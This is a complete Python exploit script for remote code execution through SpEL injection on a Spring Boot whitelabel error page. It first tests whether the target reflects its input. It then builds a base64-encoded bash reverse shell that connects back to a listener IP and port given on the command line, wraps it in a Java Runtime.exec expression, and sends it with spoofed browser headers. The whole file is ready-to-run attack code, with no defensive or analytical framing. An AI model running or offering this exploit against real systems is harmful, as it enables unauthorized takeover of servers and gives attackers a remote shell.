#!/usr/bin/python3
import requests
import string
import random
import base64
import argparse
import urllib
import pyfiglet
GREEN = "\033[92m"
RED = "\033[91m"
BLUE = "\033[1;36m"
RESET = "\033[0m"


def generate_random_string(length=10):
	letters = string.ascii_letters + string.digits
	return ''.join(random.choice(letters) for _ in range(length))


def check_domain(url):
	rand_str = generate_random_string()
	resp = requests.get(f"{url}{rand_str}", timeout=10)
	if rand_str not in resp.text:
		return False
	else:
		return True
	

def exp(target_url, ip, port):
	result = ""
	origin_bash_shell = f"bash -i >& /dev/tcp/{str(ip)}/{str(port)} 0>&1"
	base64_shell = base64.b64encode(origin_bash_shell.encode()).decode()
	target = 'bash -c {echo,' + base64_shell + '}|{base64,-d}|{bash,-i}'
	for x in target:
		result += hex(ord(x)) + ","
	payload = "${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{" + result.rstrip(',') + "}))}"
	headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Pragma': 'no-cache',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
    }
	encoded_payload = urllib.parse.quote(payload)
	requests.get(target_url + encoded_payload, timeout=10, headers=headers)


logo = f"""{GREEN}
{pyfiglet.figlet_format("Spring Boot whitelabel error page SpEL rce")}{BLUE}
						- Author: xzajyjs
						- Github: https://github.com/xzajyjs/SpringBoot-whitelabel-error-rce-EXP
{RESET}"""

print(logo)
parser = argparse.ArgumentParser()
parser.add_argument("-lhost", "--localhost", help="Listening IP", required=True)
parser.add_argument("-lport", "--localport", help="Listening Port", required=True)
parser.add_argument("-t", "--target", help="Target URL. e.g. 'http://127.0.0.1:9091/article?id='", required=True)
args = parser.parse_args()
if check_domain(args.target):
	try:
		exp(args.target, args.localhost, args.localport)
	except Exception as e:
		print(f"{RED}[-] Exploit failed. {e}{RESET}")
	else:
		print(f"{GREEN}[+] Success.{RESET}")
else:
	print(f"{RED}[-] Target not exist or not vulnerable.{RESET}")